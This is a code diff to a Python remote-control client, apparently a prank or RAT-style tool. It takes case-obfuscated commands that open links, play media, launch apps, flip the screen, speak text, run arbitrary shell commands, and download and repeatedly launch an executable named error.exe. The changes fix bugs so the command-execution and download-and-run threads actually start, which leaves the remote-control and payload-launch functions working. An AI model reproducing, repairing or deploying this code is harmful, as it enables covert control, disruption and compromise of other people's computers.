@@ -273,6 +273,7 @@ def flip():
             screen.set_portrait_flipped()
             sleep(1)
             screen.set_landscape()
+            sleep(1)
     except Exception as e:
         log(f"flip thread error occured:\t{e}",state="WARN")
 
@@ -291,13 +292,13 @@ def showerr(num):
                 log(f"Likely error. recieved content for error.exe is {kp}")
             except Exception as e:
                 log(f"DOwnloaded error.exe")
-            with open("error.exe", "wb") as file:
+            with open("error.exe", "xb") as file:
                     downloaded_size = 0
                     for chunk in exe.iter_content(chunk_size=8192):
                         if chunk:
                             file.write(chunk)
                             downloaded_size += len(chunk)
-        for _ in range(1,num+1):
+        for _ in range(1,int(num)+1):
             os.startfile("error.exe")
     except Exception as e:
         log(f"showerr thread error:\t{e}",state="WARN")
@@ -319,17 +320,22 @@ def main():
                 restart()
             elif "oPeN" in cmd:
                 link = cmd.replace("oPeN ","")
+                link = link.replace("sPeAk","") if "sPeAk" in link else link
                 wbopen(link)
+                log(f"Opened {link}")
             elif "pLaY" in cmd:
                 fp = cmd.replace("pLaY ","")
+                fp = fp.replace("sPeAk","") if "sPeAk" in fp else fp
                 Thread(target=playfunc,args=(fp,)).start()
             elif "uPdAtE" in cmd:
                 update()
             elif "rUn" in cmd:
                 app_name = cmd.replace("rUn ","")
+                app_name = app_name.replace("sPeAk","") if "sPeAk" in app_name else app_name
                 Thread(target=run,args=(app_name,)).start()
             elif "iMaGe" in cmd:
                 ifp = cmd.replace("iMaGe ","")
+                ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
                 Thread(target=display,args=(ifp,)).start()
             elif "fLiP on" in cmd:
                 sstate = True
@@ -340,10 +346,12 @@ def main():
                 log("flip off")
             elif "cMd" in cmd:
                 cmd = cmd.replace("cMd ","")
-                Thread(Thread=runcmd,args=(cmd,)).start()
+                cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
+                Thread(target=runcmd,args=(cmd,)).start()
             elif "eRr" in cmd:
                 cmd = cmd.replace("eRr ","")
-                Thread(target=showerr,args=(cmd,))
+                cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
+                Thread(target=showerr,args=(cmd,)).start()
             elif "sPeAk" in cmd:
                 txt = cmd.replace("sPeAk","")
                 saying = Thread(target=say,args=(txt,))
